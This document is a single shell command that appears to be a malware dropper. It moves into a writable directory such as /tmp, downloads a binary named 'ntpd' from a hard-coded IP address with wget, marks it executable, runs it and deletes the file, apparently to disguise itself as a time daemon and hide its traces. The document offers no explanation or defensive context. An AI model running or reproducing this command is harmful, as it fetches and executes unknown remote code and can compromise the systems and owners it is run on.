cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.232.65.211/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
